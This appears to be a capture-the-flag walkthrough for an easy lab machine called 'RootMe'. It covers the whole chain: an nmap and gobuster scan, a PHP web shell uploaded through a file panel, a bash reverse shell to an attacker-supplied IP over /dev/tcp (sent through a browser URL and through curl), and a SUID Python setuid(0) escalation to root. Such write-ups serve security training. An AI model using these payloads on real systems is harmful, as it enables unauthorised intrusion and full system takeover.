# RootMe

> **Purpose :** Capture the Flag 
> **Machine Level :** Easy

 ---
 
## First Step

- Scan of the machine : use of Nmap with sS, sV and Pn to consider the machine active
- 2 open ports : 22 ssh and 8080 apache 2.4.41
- if 8080 and apache open then it means there's a website.
- with the help of gobuster we can find sub directories.

  `gobuster dir -u http://10.10.10.10/ -w /usr/share/wordlists/dirb/common.txt`
- With that we find the sub direcotry panel, that allows us to upload a document.

---

## Second Step

- If we can upload a document, we can try to upload a reverse shell
- the script for the reverse shell :
```bash
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
else {
   echo file_get_contents('/flag.txt');}
?>
```
- This shell lets us enter commands.
- To have access to this shell, we use netcat.
  On the attacker machine :
  ```bash
  nc -lvnp 4444
  ```

  On the victim machine we can use two different techniques.
  First one is to enter the command in the url directly in the browser with this :
  `http://<IP>/uploads/<nom>.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<TON_IP>/4444%200%3E%261%27`

  The second method is to to a curl in the terminal to avoid the special characters in the browser :
  `curl -G http://<IP>/uploads/<nom>.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<TON_IP>/4444 0>&1'"`

---

  ## Third Step

- After we hace access to the shell in a terminal, we can find the files with SUID permissions
- the purpose of this is to do a privilege escalation to gain access to root
- to find the files we use ```bash find / -perm 4000 -type f 2>/dev/null ```
- We find a python software with SUID permissions, we can use that to escalate our permissions.
- we can use this script to get to the root :
- ```bash
  python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
  -Finally we can go get the information to the root directory and find the flag in root.txt

  ---
